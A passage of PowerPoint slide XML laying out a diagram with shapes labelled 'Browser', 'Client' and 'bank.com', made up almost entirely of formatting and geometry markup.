                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162821" name="object 5"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2821081" y="3004578"/>
            <a:ext cx="1242453" cy="1339103"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 1821814"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 3763 w 1821814"/>
              <a:gd name="T5" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 1821814"/>
              <a:gd name="T7" fmla="*/ 8138 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 1821814"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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21814" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="1821218" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1821218" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="009CFD">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3053603" y="3545262"/>
            <a:ext cx="890868" cy="258084"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1677" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>B</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-31" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>r</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="1677" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>owser</a:t>
            </a:r>
            <a:endParaRPr sz="1677" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3036795" y="2536732"/>
            <a:ext cx="815228" cy="380232"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="8779" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2471" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Client</a:t>
            </a:r>
            <a:endParaRPr sz="2471">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162824" name="object 8"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="4395508"/>
            <a:ext cx="1553415" cy="1410541"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId4"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162825" name="object 9"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162826" name="object 10"/>
          <p:cNvSpPr>
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="4430527"/>
            <a:ext cx="1484779" cy="1340503"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst>
              <a:gd name="T0" fmla="*/ 0 w 2176145"/>
              <a:gd name="T1" fmla="*/ 0 h 1905000"/>
              <a:gd name="T2" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T3" fmla="*/ 0 h 1905000"/>
              <a:gd name="T4" fmla="*/ 4547 w 2176145"/>
              <a:gd name="T5" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T6" fmla="*/ 0 w 2176145"/>
              <a:gd name="T7" fmla="*/ 8345 h 1905000"/>
              <a:gd name="T8" fmla="*/ 0 w 2176145"/>
              <a:gd name="T9" fmla="*/ 0 h 1905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76145" h="1905000">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="2176145" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2176145" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="1905000"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="00D026">
              <a:alpha val="50195"/>
            </a:srgbClr>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pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7534556" y="4430526"/>
            <a:ext cx="1484779" cy="831028"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="2634" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPts val="21"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr sz="3177" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Times New Roman"/>
              <a:cs typeface="Times New Roman"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="78572" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2206" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Courier New"/>
                <a:cs typeface="Courier New"/>
              </a:rPr>
              <a:t>bank.com</a:t>
            </a:r>
            <a:endParaRPr sz="2206" dirty="0">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Courier New"/>
              <a:cs typeface="Courier New"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162828" name="object 12"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7509343" y="1350309"/>
            <a:ext cx="1536606" cy="1393732"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId6"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="162829" name="object 13"/>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="7534556" y="1360114"/>
            <a:ext cx="1484779" cy="1339103"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:blipFill dpi="0" rotWithShape="1">
            <a:blip r:embed="rId5"/>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defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
